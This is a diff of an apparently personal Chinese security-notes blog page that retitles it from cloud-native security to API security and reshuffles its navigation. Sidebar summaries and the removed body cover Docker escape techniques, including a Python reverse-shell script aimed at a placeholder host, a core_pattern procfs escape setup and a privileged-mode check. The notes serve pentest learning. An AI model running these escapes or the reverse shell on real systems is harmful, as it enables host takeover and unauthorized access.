@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width">
-<title>云原生安全 | mrlxl的知识库</title>
+<title>API安全 | mrlxl的知识库</title>
 
 <script>
 (function() {
@@ -184,6 +184,18 @@ window.MathJax = {
 
 <ul class="tree-list">
   
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/api%E5%AE%89%E5%85%A8/api%E5%AE%89%E5%85%A8/" class="article-link" data-summary="API安全 一. API基础知识 1.1 API 概念 API 全称：Application Programming Interface 应用编程接口
+简单来说，API 就是服务器对外开的一个“窗口”，外部程序通过这个窗口按规则请求功能，服务器返回结果。只要是用于规范“如何调用功能、如何交换数据”的接口，都可以抽象成为 API。
+1.2 API 标准 API 标准的 API 文档最小完备集合 包含以下八点，任何一个对外 API，少一个都算 “不规范” ：
+服务器地址： 用于说明 API 所在的服务器域名或 IP 地址。 通信协议 / 通信地址（Protocol）： 指明接口采用的通信协议，如 HTTP 或 HTTPS，其中 HTTPS 为当前主流的安全通信方式。 Endpoint（接口路径）： 采用一个接口（接口功能）对应一个 url 这样是非常方便的。 版本： 防止接口升级，与其对接的其他系统没有改，导致客户端炸了。 消息格式： 数据长什么样，是 XML，json? 2026年最近几年常用的是 json。 请求响应字段描述： 对接口请求参数和返回数据的字段名称、类型、含义及是否必填进行详细说明，是 API 文档的核心部分。 响应码： 程序判断成功/失败的依据，响应码的描述就是是给非技术业务人员看的那些，本质就是像 IDE 中代码报错内容的再封装。 接口安全要求： 身份认证，鉴权，比如 API Key。 详细结构可参考 OpenAPI 规范（以前也叫 Swagger 规范，是应用及其广泛的规范） ，这是一个将 API 的各项定义和结构以“图/树”的方式展示出来，帮助开发者理解规范本身的组织和含义的 可视化浏览规范（末尾链接）
+">API安全</a>
+        
+      </div>
+    </li>
+  
 
   
 </ul>
@@ -193,7 +205,7 @@ window.MathJax = {
   
     <li>
       <span class="tree-toggle collapsed"></span>
-      <span class="section-link" style="cursor: pointer;"><strong>云安全</strong></span>
+      <span class="section-link" style="cursor: pointer;"><strong>云上攻防安全</strong></span>
       <div class="tree-children hidden" style="display: none;">
         
 
@@ -210,7 +222,22 @@ window.MathJax = {
     <li>
       <div class="tree-item-wrapper">
         <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
-        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/" class="article-link" data-summary="云原生安全 一. docker 逃逸 docker 简单来说就是一个利用操作系统实现的逻辑上独立的空间。那么 docker 逃逸即为获取 docker 容器权限之后，如何跳出 docker 容器，实现真机的控制。
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2%E5%AE%89%E5%85%A8/%E4%BA%91%E4%BA%A7%E5%93%81%E5%AE%89%E5%85%A8/" class="article-link" data-summary="堡垒机 堡垒机是部署在内网与运维人员之间的“唯一强制关卡”，所有对服务器、网络设备、数据库的运维操作都必须先经过它，由它完成身份核实、权限判断、操作录像，确保“谁能连什么、连上后干了什么”全程可控可查。
+堡垒机既能够是逻辑上的一个结点，也能够是单独的一台物理主机。 堡垒机与内网的拓扑结构与一张 Web 控制面板示例如图所示： 那么进入内网环境之后（拿到一台主机的权限后），怎么去识别 哪台主机可能为堡垒机：
+看网络流量（如果已有权限）：如果你已经拿下了内网某台主机，可以查看它的网络连接（netstat -ano）。堡垒机通常是运维人员连接的“跳板”，入流量会来自多个管理员 IP，出流量会指向大量后端服务器。一台机器如果同时与大量不同主机有 SSH/RDP 连接，嫌疑就很大。
+查常见管理子域或命名：虽然在内网不一定有 DNS，但如果有资产表或 DNS 记录，可以留意 bastion、jump、vpn、admin 这类命名的主机。
+判断这台主机是否为堡垒机 ：
+端口特征识别（误差较大）：除了常见的 22（SSH）、3389（RDP）外，堡垒机往往会开放特定的管理端口。例如，华为云堡垒机默认会开放 2222（SSH 客户端登录）、53389（MSTSC 登录）以及 80/443/8080 用于 Web 管理。如果你发现某台主机同时开放了 Web 管理端口和非常规的 SSH/RDP 代理端口，它很可能就是堡垒机。 Web 管理界面：这是最直接的判定依据。在浏览器中访问该主机的 IP（通常是 http 或 https）。堡垒机的登录页面通常标题或页脚会包含“运维安全”、“堡垒机”、“Bastion”、“Audit”等字样，或者直接显示厂商 Logo。 服务指纹识别（厂商可能会修改 Banner）：如 nmap WhatWeb 等工具进行探测。 判断完这台主机是堡垒机后，还需要进一步通过 Web 特征等方式判断这个是哪个厂商的堡垒机，以方便进一步进行漏洞的利用（比如批量打 poc）。
+一些厂商的漏洞库：
+NVD漏洞库 阿里云漏洞库 国家信息安全漏洞共享平台 ">云产品安全</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/" class="article-link" data-summary="云原生安全 一. docker 逃逸 docker 简单来说就是一个利用操作系统实现的逻辑上独立的空间。那么 docker 逃逸即为获取 docker 容器权限之后，如何跳出 docker 容器，实现真机的控制。
 1.1 docker 空间识别 获取到一个机器的权限之后，第一件事 是去判断这个容器是否为 docker 容器，有以下几条命令去判断当前属于 docker 环境而并非真机环境：
 检查方式 命令 判断依据 Docker 标记文件 ls -la /.dockerenv 文件存在是 Docker 常见标志 进程信息 cat /proc/1/cgroup 查看进程所属的控制组 操作系统信息 cat /etc/os-release 查看当前用户空间发行版 命名空间 ls -l /proc/1/ns/ 查看进程的命名空间信息 1.2 docker 特权模式判断与利用 判断这个容器是否为特权模式启动： Docker 的特权模式由启动容器时的 &amp;amp;ndash;privileged 参数控制。 执行以下命令，判断当前是否为特权模式:
 CAPHEX=$(awk &amp;amp;#39;/CapEff/ {print $2}&amp;amp;#39; /proc/self/status) CAPDEC=$((16#$CAPHEX)) if [ $((CAPDEC &amp;amp;amp; 0x200000)) -ne 0 ]; then echo &amp;amp;#34;Privileged: CAP_SYS_ADMIN set (CapEff=$CAPHEX)&amp;amp;#34; else echo &amp;amp;#34;Not privileged: CAP_SYS_ADMIN missing (CapEff=$CAPHEX)&amp;amp;#34; fi 这里展示一个如何利用特权模式进行的 docker 容器的逃逸： 通过这个实验也能看出，若有些镜像本身就存在一些问题，比如镜像提前预埋了反弹链接那么当你用特权模式进行启动容器的时候就会出现钓鱼攻击的情况。
@@ -222,7 +249,32 @@ CAPHEX=$(awk &amp;amp;#39;/CapEff/ {print $2}&amp;amp;#39; /proc/self/status) CA
     <li>
       <div class="tree-item-wrapper">
         <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
-        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法 Docker相关安全风险更多集中在Docker逃逸方面
+和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
+判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
+不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
+ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
+挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
+user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
+而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
+从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
+环境搭建 创建容器并挂载/proc目录：
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
+信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
+find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
+cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
+接下来安装vim和gcc：
+apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
+#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
+">Docker逃逸手法</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
 常见名词 记录一些常见的专业术语的意思
 容器 这玩意打CTF的应该都比较熟悉
 Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
@@ -249,7 +301,7 @@ Docker 容器与虚拟机类似，但二者在原理上不同:
     <li>
       <div class="tree-item-wrapper">
         <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
-        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
 国内云厂商：
 阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
 AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
@@ -260,116 +312,12 @@ S3对象存储（Simple Storage Service），可以简单理解为网盘，略�
 Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
 Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
 AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
-">云服务学习</a>
-        
-      </div>
-    </li>
-  
-    <li>
-      <div class="tree-item-wrapper">
-        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
-        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
-虚拟机 虚拟机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
-Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
-K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
-二、思路 如果shell处于虚拟机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
-虚拟机：通常考虑横向移动来扩大攻击效果
-Docker：通常先进行容器逃逸，再进行内网横向移动
-K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
-三、识别 首先判断当前shell是否采用了虚拟化技术：
-systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
-查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
-hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
-cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
-grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
-通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
-ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
-通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
-mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
-通过查看硬盘信息，推断当前环境是否为容器环境:
-fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
-获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
-df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
-通过检查环境变量，了解特定环境的信息:
-env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
-">识别虚拟机、Docker和K8s集群环境</a>
+">云服务安全</a>
         
       </div>
     </li>
   
 
-  
-    <li>
-      <span class="tree-toggle collapsed"></span>
-      <span class="section-link" style="cursor: pointer;"><strong>docker安全</strong></span>
-      <div class="tree-children hidden" style="display: none;">
-        
-
-
-
-  
-  
-  
-    
-  
-
-<ul class="tree-list">
-  
-    <li>
-      <div class="tree-item-wrapper">
-        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
-        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
-Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
-不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
-不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
-敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
-活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
-不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
-不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
-不安全的配置/挂载 正常来说，容器有两大隔离机制：
-linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
-&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
-UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
-普通用户被加到Docker用户组内
-如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
-Unix socket挂载到容器内部
-有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
-">Docker安全概览</a>
-        
-      </div>
-    </li>
-  
-    <li>
-      <div class="tree-item-wrapper">
-        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
-        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
-和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
-判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
-不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
-ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
-挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
-user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
-而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
-从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
-环境搭建 创建容器并挂载/proc目录：
-docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
-信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
-find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
-cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
-接下来安装vim和gcc：
-apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
-#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
-">Docker逃逸手法大全</a>
-        
-      </div>
-    </li>
-  
-
-  
-</ul>
-
-      </div>
-    </li>
   
 </ul>
 
@@ -1164,253 +1112,125 @@ of in on at for to from with by about between among through across during before
 </div>
   <div class="content-center">
     <article class="markdown-body">
-      <h1 class="post-title-template">云原生安全</h1>
+      <h1 class="post-title-template">API安全</h1>
       <div class="post-date" style="margin-bottom: 20px; color: var(--text-color); opacity: 0.7; font-size: 0.9em;">
         
         
-            2026-11-23
+            2026-11-27
         
       </div>
-      <h1 id="云原生安全">云原生安全</h1>
-<h2 id="一-docker-逃逸">一. docker 逃逸</h2>
+      <h1 id="api安全">API安全</h1>
+<h2 id="一-api基础知识">一. API基础知识</h2>
+<h3 id="11-api-概念">1.1 API 概念</h3>
 <blockquote>
-<p>docker 简单来说就是一个利用操作系统实现的逻辑上独立的空间。那么 docker 逃逸即为获取 docker 容器权限之后，如何跳出 docker 容器，实现真机的控制。</p>
+<p>API 全称：<strong>Application Programming Interface 应用编程接口</strong></p>
 </blockquote>
-<h3 id="11-docker-空间识别">1.1 docker 空间识别</h3>
-<p>获取到一个机器的权限之后，<strong>第一件事</strong> 是去判断这个容器是否为 docker 容器，有以下几条命令去判断当前属于 docker 环境而并非真机环境：</p>
-<table>
-  <thead>
-      <tr>
-          <th>检查方式</th>
-          <th>命令</th>
-          <th>判断依据</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>Docker 标记文件</td>
-          <td><code>ls -la /.dockerenv</code></td>
-          <td>文件存在是 Docker 常见标志</td>
-      </tr>
-      <tr>
-          <td>进程信息</td>
-          <td><code>cat /proc/1/cgroup</code></td>
-          <td>查看进程所属的控制组</td>
-      </tr>
-      <tr>
-          <td>操作系统信息</td>
-          <td><code>cat /etc/os-release</code></td>
-          <td>查看当前用户空间发行版</td>
-      </tr>
-      <tr>
-          <td>命名空间</td>
-          <td><code>ls -l /proc/1/ns/</code></td>
-          <td>查看进程的命名空间信息</td>
-      </tr>
-  </tbody>
-</table>
-<p><img src="http://tuchuang.mrlxl.cn/picture/20261114200825823.png" alt="docker 空间识别"></p>
-<h3 id="12-docker-特权模式判断与利用">1.2 docker 特权模式判断与利用</h3>
-<p>判断这个容器是否为特权模式启动：
-Docker 的特权模式由启动容器时的 &ndash;privileged 参数控制。
-执行以下命令，判断当前是否为特权模式:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">CAPHEX</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">awk</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">CapEff</span><span class="o">/</span> <span class="p">{</span><span class="n">print</span> <span class="err">$</span><span class="mi">2</span><span class="p">}</span><span class="err">&#39;</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">status</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">CAPDEC</span><span class="o">=</span><span class="err">$</span><span class="p">((</span><span class="mi">16</span><span class="err">#$</span><span class="n">CAPHEX</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">[</span> <span class="err">$</span><span class="p">((</span><span class="n">CAPDEC</span> <span class="o">&amp;</span> <span class="mh">0x200000</span><span class="p">))</span> <span class="o">-</span><span class="n">ne</span> <span class="mi">0</span> <span class="p">];</span> <span class="n">then</span>
-</span></span><span class="line"><span class="cl">    <span class="n">echo</span> <span class="s">&#34;Privileged: CAP_SYS_ADMIN set (CapEff=$CAPHEX)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">else</span>
-</span></span><span class="line"><span class="cl">    <span class="n">echo</span> <span class="s">&#34;Not privileged: CAP_SYS_ADMIN missing (CapEff=$CAPHEX)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">fi</span>
-</span></span></code></pre></div><p>这里展示一个如何利用特权模式进行的 docker 容器的逃逸：
-<img src="http://tuchuang.mrlxl.cn/picture/20261116123225255.png" alt="特权模式进行的 docker 容器的逃逸">
-通过这个实验也能看出，若有些镜像本身就存在一些问题，比如镜像提前预埋了反弹链接那么当你用特权模式进行启动容器的时候就会出现钓鱼攻击的情况。</p>
-<p>更多特权模式下容器逃逸参考：
-<a href="https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html">Privileged 特权模式容器逃逸</a></p>
-<h3 id="13-docker-危险挂载">1.3 docker 危险挂载</h3>
-<p>首先理解什么叫做挂载，简单来说 <strong>挂载就是把一个文件系统或目录接入当前系统的目录树，让进程能够通过某个路径访问它。</strong>
-如：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">v</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="nl">project</span><span class="p">:</span><span class="o">/</span><span class="n">workspace</span> <span class="nl">ubuntu</span><span class="p">:</span><span class="mf">22.04</span>
-</span></span><span class="line"><span class="cl"><span class="cm">/*
-</span></span></span><span class="line"><span class="cl"><span class="cm">这条命令执行之后让真机的 /home/admin/project 目录
-</span></span></span><span class="line"><span class="cl"><span class="cm">映射到 ubuntu:22.04 这个 docker 容器的 /workspace 目录。
-</span></span></span><span class="line"><span class="cl"><span class="cm">挂载之后就能够通过容器的 /workspace 目录直接访问主机的 /home/admin/project 目录
-</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
-</span></span></code></pre></div><p>通过如下命令查看当前 docker 下的挂载：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mounts</span>
-</span></span></code></pre></div><p>注意：docker 启动的时候就会自动有许多基础挂载，不要把这些都当成可疑挂载，如下图所示其实都是基础挂载：
-<img src="http://tuchuang.mrlxl.cn/picture/20261114223024214.png" alt="基础挂载"></p>
-<p><strong>那什么又叫做危险挂载？</strong> Docker 容器将宿主机上具有敏感性或高权限的文件、目录、设备或系统接口挂载到容器内部，使容器进程能够访问或操作超出预期范围的宿主机资源，从而削弱容器与宿主机之间的隔离边界。</p>
-<p>具体怎么利用这些危险挂载如下，（了解具体原理需深入了解 docker 系统架构，如果只想会利用，参考如下两篇文章即可）：
-<a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">挂载宿主机 procfs 逃逸</a>
-<a href="https://wiki.teamssix.com/CloudNative/Docker/docker-socket-escape.html">挂载 Docker Socket 逃逸</a></p>
-<h3 id="14-cdk-自动化渗透">1.4 CDK 自动化渗透</h3>
